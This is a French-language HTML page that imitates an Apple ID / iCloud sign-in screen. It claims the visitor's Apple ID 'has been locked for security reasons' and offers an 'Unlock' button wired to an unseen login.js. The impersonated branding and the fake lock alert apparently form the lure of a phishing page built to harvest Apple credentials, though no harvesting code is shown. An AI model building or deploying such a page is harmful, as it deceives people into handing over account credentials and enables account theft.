<!DOCTYPE html>
<html lang="fr">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Se connecter avec un identifiant Apple</title>
    <link
      rel="shortcut icon"
      href="../photo/Apple-Emblem.png"
      type="image/x-icon"
    />
    <link rel="stylesheet" href="../font/css/all.min.css" />
    <link rel="stylesheet" href="styles.css" />
  </head>
  <body>
    <header class="logo" style="display: flex">
      <i class="fab fa-apple"></i>
      iCloud
    </header>

    <main>
      <div class="container">
        <img src="/photo/bg.png" alt="Apple ID Icon" class="icon" />
        <h2>Se connecter avec un identifiant Apple</h2>

        <h4>
          Cet identifiant Apple a été verrouillé pour des raisons de sécurité.
        </h4>
        <p>Vous devez déverrouiller votre compte avant de vous connecter.</p>
        <div class="button-group">
          <button id="cancel-btn">Annuler</button>
          <button id="submit-btn">Déverrouiller</button>
        </div>

        <a href="#" class="create-id">Créer un identifiant Apple</a>
      </div>
    </main>

    <footer></footer>

    <script src="login.js"></script>
  </body>
</html>
